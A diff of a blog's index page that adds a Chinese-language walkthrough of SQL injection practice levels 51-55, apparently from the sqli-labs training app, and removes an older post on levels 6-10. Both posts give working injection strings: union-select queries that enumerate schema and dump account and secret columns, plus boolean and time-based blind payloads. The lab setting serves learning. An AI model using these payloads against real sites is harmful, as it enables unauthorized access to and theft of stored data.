@@ -310,6 +310,64 @@
 
 
   
+    <article id="post-sql-51-55关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/12/27/sql-51-55%E5%85%B3/" class="article-date">
+  <time class="dt-published" datetime="2022-12-27T06:26:08.000Z" itemprop="datePublished">2022-12-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/12/27/sql-51-55%E5%85%B3/">sql 51-55关</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>sql第五十一关</p>
+<p>1.单引号闭合，其它操作相同</p>
+<p>sql第五十二关</p>
+<p>1.无报错回显，bool盲注即可</p>
+<p>sql第五十三关</p>
+<p>1.单引号闭合，采用时间盲注，其它同上</p>
+<p>sql第五十四关</p>
+<p>1.欢迎界面换新了，从黄字来看，需要输入id来闯关，蓝字则提示了，只有10次尝试，次数达到限制则会随机重置表名，输入?id&#x3D;1，查看正常输入时页面反馈，输入?id&#x3D;1 and 1&#x3D;2，可以确定是字符型，输入?id&#x3D;1’–+尝试闭合成功</p>
+<p>2.跳过输入?id&#x3D;1 order by 3–+节约机会，直接输入?id&#x3D;-1’ union select 1,2,3–+，查看回显位</p>
+<p>3.输入?id&#x3D;-1’ union select 1,database(),version()–+爆库，库名再也不是熟悉的security了，那也就意味着，数据表名字段之类的可能都有变化</p>
+<p>4.输入?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’challenges’–+爆表，表名是一串字母，判断非任何加密方式，直接代入下一个语句</p>
+<p>5.输入?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’challenges’ and table_name&#x3D;’lbrygvpgxk’–+，符合条件的字段一共有4个，从字段名来看，id应该就是我们所熟悉的id，secret_TWXA应该是指密码，账号的话应该是在sessid和tryy之间</p>
+<p>6.查询id和sessid，输入?id&#x3D;-1’ union select 1,group_concat(id),group_concat(sessid) from lbrygvpgxk–+，查询secret_TWXA和tryy，输入?id&#x3D;-1’ union select 1,group_concat(secret_TWXA),group_concat(tryy) from lbrygvpgxk–+，经过对比参数值，账号名字段就是sessid，密码是secret_8P2L，tryy 应该就是登录次数，id就是普通id</p>
+<p>7.输入?id&#x3D;-1’ union select 1,group_concat(sessid),group_concat(secret_TWXA) from lbrygvpgxk–+爆数据，限制在十条语句之内，表名没有改变，查询成功</p>
+<p>sql第五十五关</p>
+<p>1.这关页面告诉我们允许尝试十四次，输入?id&#x3D;1，输入?id&#x3D;1 and 1&#x3D;2确定类型是数值型，但是虽然没有单双引号，还要再判断一步是否外面有括号，输入?id&#x3D;-1) union select 1,2,3–+成功闭合</p>
+<p>2.输入?id&#x3D;-1) union select 1,database(),version()–+爆库和版本</p>
+<p>3.输入?id&#x3D;-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’challenges’–+爆表，这次随机表名为‘shjkpost89’</p>
+<p>4.输入输入?id&#x3D;-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’challenges’ and table_name&#x3D;’shjkpost89’–+爆字段</p>
+<p>5.输入?id&#x3D;-1) union select 1,group_concat(sessid),group_concat(secret_8NDU) from shjkpost89–+爆数据</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/12/27/sql-51-55%E5%85%B3/" data-id="clger5nfs0000dsxxb7c5fojl" data-title="sql 51-55关" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-sql-46-50关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/12/26/sql-46-50%E5%85%B3/" class="article-date">
@@ -608,63 +666,6 @@
 
 
   
-    <article id="post-sql-6-10关" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/12/12/sql-6-10%E5%85%B3/" class="article-date">
-  <time class="dt-published" datetime="2022-12-12T04:43:21.000Z" itemprop="datePublished">2022-12-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/12/12/sql-6-10%E5%85%B3/">sql 6-10关</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>sql第六关</p>
-<p>1.输入id&#x3D;1”报错，初步判断是双引号型字符注入，验证后发现确实</p>
-<p>2.发现可以使用报错注入等，与上一关无区别</p>
-<p>sql第七关</p>
-<p>1.输入id&#x3D;1’报错，输入id&#x3D;1”#，正常回显，但是表明双引号被过滤，说明不是双引号过滤，由于单引号报错，就继续试，发现id&#x3D;-1”))#成功了</p>
-<p>2.跟前几关无异</p>
-<p>sql第八关</p>
-<p>1.输入id&#x3D;1’，页面变化但没报错，输入其它的发现页面均正常回应，因此从单引号开始入手，输入id&#x3D;1’#发现就是单引号注入，但是发现注入后根本不回显任何信息。</p>
-<p>2.采用bool盲注，输入id&#x3D;1’ and length(database()) &#x3D;1 –+，一直没反应，知道输入到8为止，正常回显，所以数据库长度是8</p>
-<p>3.猜库名，输入id&#x3D;1’ and ascill(substr(database(),1,1))&gt;97 –+，渐渐爆出来了，然后拼就行。</p>
-<p>4.然后猜表名列名，总有把范围缩小完的时候。</p>
-<p>sql第九关</p>
-<p>1.不断判断注入方式，但页面没有任何变化，因此需要寻找参照点</p>
-<p>2.选择时间盲注，输入id&#x3D;x and if(x,sleep(a),1)，不断尝试注入方式，查看页面的反应时间，在id&#x3D;1”的时候反应时间变慢，所以是双引号注入。</p>
-<p>3.if()函数中：<br>    x为布尔盲注中的长度、字符猜测语句，如：length(database())&#x3D;1<br>    sleep()函数，a为时间间隔，如果前面的语句x为真，则在页面出来前间隔a秒；<br>    1：占位</p>
-<p>4.使用对应语句，然后把表名列名弄出来。</p>
-<p>sql第十关</p>
-<p>1.还是没反应，跟第九关一样，最后试出来是双引号闭合</p>
-<p>2.操作如第九关</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/12/sql-6-10%E5%85%B3/" data-id="clg86utyz0000lwxx9h5g46yc" data-title="sql 6-10关" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -717,7 +718,7 @@
           </li>
         
           <li>
-            <a href="/2022/12/26/sql-46-50%E5%85%B3/">sql 46-50关</a>
+            <a href="/2022/12/27/sql-51-55%E5%85%B3/">sql 51-55关</a>
           </li>
         
       </ul>
